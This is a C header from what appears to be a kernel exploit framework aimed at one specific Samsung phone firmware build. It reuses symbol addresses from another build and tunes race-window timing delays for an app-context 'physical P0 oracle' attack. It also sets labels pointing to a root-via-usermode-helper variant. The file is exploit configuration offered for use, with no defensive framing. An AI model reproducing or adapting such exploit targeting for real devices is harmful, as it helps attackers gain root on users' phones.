#ifndef E3Q_S928USQS6DZG1_TARGET_H
#define E3Q_S928USQS6DZG1_TARGET_H

/*
 * DZG1 retains the DZF2 symbol addresses and complete BTF layout exactly.
 * Keep that shared, audited constant set explicit while using DZG1's distinct
 * physical-page fingerprint below.
 */
#include "../e3q-S928USQS6DZF2/target.h"

/*
 * The app-context DZG1 run reached the physical P0 oracle at 25 ms but missed
 * the pselect write window.  Sweep nearby device-local timings while keeping
 * the outer exploit attempt count unchanged.
 */
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#undef SLIDE_PHYSICAL_SLOT_DELAYS_USEC
#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC 20000, 30000, 50000
#endif

#undef BUILD_VARIANT_LABEL
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL \
  "e3q-S928USQS6DZG1-app-physical-p0-oracle-timing3"
#else
#define BUILD_VARIANT_LABEL "e3q-S928USQS6DZG1-root-umh"
#endif

#undef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/e3qsqw/e3q:16/BP4A.251205.006/S928USQS6DZG1:user/release-keys"

#undef P0_FINGERPRINT_HEADER
#define P0_FINGERPRINT_HEADER \
  "targets/e3q-S928USQS6DZG1/p0_fingerprint.h"

#endif
